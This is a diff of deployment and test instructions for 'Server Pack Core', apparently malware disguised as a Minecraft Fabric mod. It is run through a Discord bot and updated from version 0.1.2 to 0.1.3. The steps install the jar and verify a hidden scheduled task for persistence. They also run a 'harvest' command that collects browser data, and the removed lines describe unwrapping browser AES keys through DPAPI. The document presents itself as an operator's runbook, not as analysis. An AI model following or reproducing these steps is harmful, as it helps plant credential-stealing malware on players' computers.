@@ -1,21 +1,23 @@
-WINDOWS DEPLOYMENT - Server Pack Core 0.1.2
+WINDOWS DEPLOYMENT - Server Pack Core 0.1.3
 
 Copy only the .jar, do not run it from the shared drive.
 
-Changes from 0.1.1: the harvest includes browsers/<browser>/keys.txt with
-the v10 AES key unwrapped through DPAPI in the session. The rest is unchanged.
+The Discord bot token was rotated on 2026-11-04. 0.1.2 and earlier no longer
+connect; remove any previous serverpackcore jar before installing.
 
-1. On Windows, check the file before using it:
+1. Go to the mods folder of the Fabric 1.20.1 profile (by default
+   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar and
+   serverpackcore-0.1.2.jar if present. Either of them must go, they use the
+   revoked token.
 
-   certutil -hashfile serverpackcore-0.1.2.jar SHA256
+2. Copy serverpackcore-0.1.3.jar into that folder.
+
+3. On Windows, check the file:
+
+   certutil -hashfile serverpackcore-0.1.3.jar SHA256
 
    It must return:
-   150e739c009b11dd9fd5d8b28ef43312edbdb1d54c190e83a1193e1c67577302
-
-2. Go to the mods folder of the Fabric 1.20.1 profile (by default
-   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar.
-
-3. Copy serverpackcore-0.1.2.jar into that folder.
+   b074f02a25e29801769ce35497528bc4f73ad11a2b617854d6a38423b59554f6
 
 4. Close Minecraft and check that no agent remains:
 
@@ -28,10 +30,10 @@ the v10 AES key unwrapped through DPAPI in the session. The rest is unchanged.
 
    type "%LOCALAPPDATA%\ServerPackCore\state.json"
 
-   It must show "version":"0.1.2".
+   It must show "version":"0.1.3".
 
 7. Send `persist on`. Expected reply: "Persistence on: true" and
-   "Hidden task: \ServerPackCore". The 0.1.1 task is overwritten, not
+   "Hidden task: \ServerPackCore". The old task is overwritten, not
    duplicated.
 
 8. Send `harvest`. For each detected browser, the ZIP must contain
@@ -47,8 +49,7 @@ the v10 AES key unwrapped through DPAPI in the session. The rest is unchanged.
 
 ROLLBACK
 
-If 0.1.2 fails: `persist off`, close Minecraft, delete 0.1.2 and restore
-serverpackcore-0.1.1.jar (still in this folder, hash
-a7cae78179a6f44876f5d7ca1099722a9e33b66abd7b8c12623de623e6d356ab).
-0.1.1 already uses a hidden task, so the mechanism does not change; only
-keys.txt is lost.
+If 0.1.3 fails: `persist off`, close Minecraft and delete 0.1.3. Restoring
+serverpackcore-0.1.2.jar brings the old code back, but it does NOT connect to
+Discord: the token is revoked, so 0.1.2 is only useful for offline
+diagnostics. Wait for a fixed build instead of staying on it.
